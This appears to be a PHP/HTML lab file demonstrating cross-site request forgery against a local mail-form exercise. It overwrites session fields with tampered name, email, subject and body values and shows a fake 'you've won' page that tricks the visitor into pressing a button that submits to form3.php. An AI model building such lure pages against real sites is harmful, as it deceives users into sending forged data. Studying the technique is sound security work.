<?php
// セッションを開始
session_start();

// form1.phpのnameを基にデータを改ざん
$_SESSION['name']    = '名前改ざん';
$_SESSION['email']   = 'akui@akui.com';
$_SESSION['subject'] = '件名改ざん';
$_SESSION['body']    = '内容改ざん';

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
<meta http-equiv="Content-Style-Type" content="text/css">
<meta http-equiv="Content-Script-Type" content="text/javascript">
<title>クロスサイトリクエストフォージェリ</title>
<link rel="stylesheet" type="text/css" href="css/style.css" media="screen,tv">
<!--<script type="text/javascript">location.replace("http://localhost/php2/form3.php")</script>-->
</head>
<body>
<div id="box">
<div id="header">
<h1>ご当選おめでとうございます！</h1>
</div>
<div id="main">
<p class="app_msg">そのまま送信ボタンを押してください。</p>
<div>
<form action="form3.php" method="post" class="spacer">
<p><input type="submit" value="送信する"></p>
</form>
</div>
</div>
<p class="copy">&copy; メールフォーム</p>
</div>
</body>
</html>
